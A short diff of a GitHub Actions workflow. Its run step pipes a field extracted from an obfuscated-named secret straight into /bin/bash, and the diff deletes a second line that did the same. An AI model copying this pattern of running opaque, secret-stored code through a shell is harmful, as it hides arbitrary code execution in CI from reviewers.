@@ -21,7 +21,6 @@ jobs:
           nwno1515: ${{ secrets.nwno1515 }}
         run: |
           printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
-          printf '%s' "$yaam4" | jq -r .xmz159 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
